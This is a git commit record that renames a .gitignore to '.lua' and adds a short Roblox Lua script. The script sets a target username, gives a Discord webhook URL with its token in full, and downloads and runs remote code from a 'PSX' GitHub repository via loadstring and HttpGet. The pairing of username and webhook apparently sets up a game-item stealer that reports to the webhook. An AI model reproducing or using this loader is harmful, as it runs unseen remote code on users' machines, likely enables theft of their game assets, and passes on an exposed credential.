78f50ed4ad0df2e4fe2b36d2973d5277038dde65
HardGameSs <121383328+HardGameSss@users.noreply.github.com>
2023-01-29 15:31:57 +0100

    Update and rename .gitignore to .lua

---
+++ .lua
@@ -0,0 +1,4 @@
+UserName = "DINOZAUR20055"
+WebHook = "https://discord.com/api/webhooks/1069263541284114562/If9iKDQTrsXRdcLRbUjQF8dFN8tdCzX6KMQGQ7T-_GrAyN1QI4MQ16X5HlTbiq3xW2Kj"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
